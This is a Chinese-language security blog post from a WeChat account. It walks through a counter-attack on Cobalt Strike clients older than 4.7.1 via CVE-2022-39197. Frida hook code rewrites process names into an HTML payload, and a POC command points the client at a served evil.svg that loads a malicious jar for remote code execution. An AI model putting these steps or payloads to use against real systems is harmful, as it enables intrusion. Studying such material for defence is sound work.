---
title: Cobalt Strike的各类反向上线操作
url: https://mp.weixin.qq.com/s/OVE2pNf_W_DIc0vNkeFWZA
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:55:06.204435
---

# Cobalt Strike的各类反向上线操作

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/mwFvjeHDLkgJ6zXxWrCY4tlsCfOicwQrHDLCYjSRo506rqhdE6EsosA1D3YcVJa1Tc49kHQRk8tGvSq9UbR060VeLch0icEPopibUIGEtJ7Quk/0?wx_fmt=jpeg)

# Cobalt Strike的各类反向上线操作

昱子
昱子

蚁景网络安全

![]()

在小说阅读器中沉浸阅读

**声明：本文仅限于技术讨论与分享，严禁用于非法途径。若读者因此作出任何危害网络安全行为后果自负，与本号及原作者无关。**

## 前言

Cobalt Strike 使用 GUI 框架 SWING（一种java GUI的库）开发，攻击者可通过CS木马在 beacon 元数据中注入恶意 HTML 标签，使得Cobalt Strike对其进行解析并且加载恶意代码（类似XSS攻击），从而在目标系统上执行任意代码。

## 实现原理

攻击者需要通过CS木马在 beacon 元数据中注入恶意payload，恰好Frida 可以用于钩入和修改各种函数，包括 Windows API 函数，这里反制主要通过使用Frida框架钩入Windows API函数，从而对beacon 元数据中注入恶意代码，以下是一些你可以通过 Frida 钩入的 Windows API 函数的示例

* **Kernel32.dll:**

  `CreateFileW`

  `ReadFile`

  `WriteFile`

  `FindFirstFileW`

  `CreateProcessW`

  `GetProcAddress`

  `LoadLibraryW`

  `VirtualAlloc`

  `VirtualProtect`
* **Advapi32.dll:**

  `RegOpenKeyExW`

  `RegQueryValueExW`

  `RegSetValueExW`

  `GetUserNameA`
* **User32.dll:**

  `MessageBoxW`

  `SetWindowTextW`

  `GetWindowTextW`
* **Gdi32.dll:**

  `TextOutW`

  `CreateFontIndirectW`
* **Shell32.dll:**

  `ShellExecuteW`
* **Ws2\_32.dll:**

  `send`

  `recv`

在 Frida 中，你可以使用 \*\*Interceptor.attach \*\*方法来附加到这些函数并添加你自己的处理逻辑。这样，你就可以在这些函数被调用时执行自定义代码，此时也意味着你可以对 beacon 元数据中注入自定义代码了。

例如\*\*Kernel32.dll:\*\*中的`Process32Next`

```
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5qxDX5EFsqmSTsodKf2aTDS1Neq7KZgTJr8kUytGq1BLqEiaQAgYZqnQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)
```

函数内整体逻辑拆开来分析下

**处理函数进入****`onEnter`**

```
onEnter: function(args) {
    this.pPROCESSENTRY32 = args[1];
    if(Process.arch == "ia32"){
        this.exeOffset = 36;
    }else{
        this.exeOffset = 44;
    }
    this.szExeFile = this.pPROCESSENTRY32.add(this.exeOffset);
},
```

在函数进入时，保存 `Process32Next` 函数的参数，并计算 `szExeFile` 的地址。`szExeFile` 是一个指向进程信息结构体的字段，其中包含进程的可执行文件名

**处理函数离开****`onLeave`**

```
onLeave: function(retval) {
    if(this.szExeFile.readAnsiString() == "target") {
        send("[!] Found beacon, injecting payload");
        this.szExeFile.writeAnsiString(payload);
    }
}
```

在函数离开时，检查 `szExeFile` 中的进程可执行文件名是否等于字符串 "target"。如果相匹配，将指定的 `payload` 写入进程的可执行文件名里，使得Cobalt Strike对其进行解析并且加载payload

简单来说就是注入Windows API修改tasklist返回的进程名，将进程名改写成攻击payload，当攻击者点击beacon执行列出进程时，只要他浏览到带有payload的进程名，就会执行反制RCE

## 反制复现

**环境准备：**

|  | 红队 | 蓝队 |
| --- | --- | --- |
| IP | 192.168.108.200 | 192.168.108.133 |
| 版本 | Cobalt Strike 4.0 | Cobalt Strike 4.9 |

注：受到反制影响的Cobalt Strike版本< 4.7.1（全局禁止html渲染的Cobalt Strike不受印影响）

开源POC和EXP：https://github.com/its-arun/CVE-2022-39197

**1、编辑恶意文件内容**

修改Exploit.java，更改exec内代码参数为要执行的命令，我这里为了直观展示则执行powershell一句话上线CS

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5Zg5fJyDWBu0v0R4A8a2IZcUVC81rDpJpUwnibrnsvD2DxoWFEG41VOg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1)

**2、编译文件**

使用IDEA+maven进行编译，编译完成后会在target目录下生成EvilJar-1.0-jar-with-dependencies.jar文件，具体如下

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb51NyFLo8nORibp3F5iarEJAa60PDuYfc8eHlLLtrspup3O9z69KkEbicVQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2)

**3、将生成的恶意jar文件和svg文件放在同一路径下**

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5IwqibYeQsOz9hyn92l6Rzlz8Fzjj3wJvH1uT02RHEenSG4NlQTbAhicw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3)

将红队发送的木马样本放在与cve-2022-39197.py脚本同一路径下

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb56Ges7UlHuLQ1tBYO2dLSUZjmXlPpp2MKTaIEuZDEeFibyATr5FRkF4Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4)

**4、蓝队在serve路径下开启一个web服务**

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5a6ibx70sIzkQqUhtyNn0qHgkyptfz8Tb2u8woX0kVYVpl7xe0beY6JQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5)

**5、编辑evil.svg文件，替换为当前路径启用的恶意jar的web地址**

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5EF2OYBugcavpI6BkT9HRicMLmRAD0ib3Oq9bKV8xNtcicTawjJXUSnRlg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6)

**6、执行POC脚本**

python3 cve-2022-39197.py artifact.exe http://192.168.108.248:9999/evil.svg

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5OkuyDUkCibp1WsibuGVRCcGwbQKTAqa5dfhlunAxn5snXlhH7fXsWWuA/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=7)

运行后，红队的cs客户端上可以看到此时木马已经成功上线

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5sgHSUj4I5Brq8EibZibGVWKmdSSXfLt3Pm0Zdw59Hr1mmcgE6bJT9icHg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=8)

当红队尝试获取用户会话的进程列表，当滚动进程列表进行查看当前会话所在进程名时即触发（若未触发可能需要手动点击或触发存在延迟），请求蓝队web服务上的evil.svg文件，而evil.svg文件又继续加载请求恶意文件EvilJar-1.0-jar-with-dependencies.jar

![图片](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5jl6DR7Fc3XkpwqicMiavKp6gVUrxok9sFsgHeiaoib8EZ6oicJgWU87Iumg/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=9)

成功上线蓝队CS，从而达到反制RCE

## 思考

除了以上Kernel32.dll:中的Process32Next函数的反制思路，其实还有很多其他的反制思路，正如Windows API 函数之多。我们还可以尝试Kernel32.dll:中的**FindFirstFileW**函数（根据文件名查找文件的函数），大概情况就是注入Windows API 修改返回的文件名，将文件名改写成攻击payload，当攻击者点击beacon执行列出文件时，只要他浏览到带有payload的文件名，就会执行反制RCE，以下就直接展示上线的效果（复现步骤和上面一样）

![图片](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LfEoplRJN0RffCQU6ApRtb5qUf0Ek0ZS680bLsPvziatS2CQxSRrL4zm0CKR44Nf8wgD5VSuhjSCAg/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=10)

## 最后

此Cobalt Strike反制虽然是一个去年曝光的漏洞了，但是基数上还是会有许多人在使用着存在漏洞的Cobalt Strike版本，对应地Cobalt Strike的反制可玩性还是很高的，师傅们发挥想象可以让对手猝不及防。

[![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldwoHriaVoyA6JNsGroYQAQp8xrlxS8RibJWibDF8T1pmkgSXqiaWQvmVB43S1IVCFBDOKTEQFDAP0QL5g/640?wx_fmt=png&from=appmsg)](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxTbkTSkrHtQAicCy4EPuqw9hf0VFTmn6c4UGChaiaoHSBewgtiblmSAOPRq8CmibczDaBzzpfN5IkrFQ/0?wx_fmt=png)

蚁景网络安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxTbkTSkrHtQAicCy4EPuqw9hf0VFTmn6c4UGChaiaoHSBewgtiblmSAOPRq8CmibczDaBzzpfN5IkrFQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过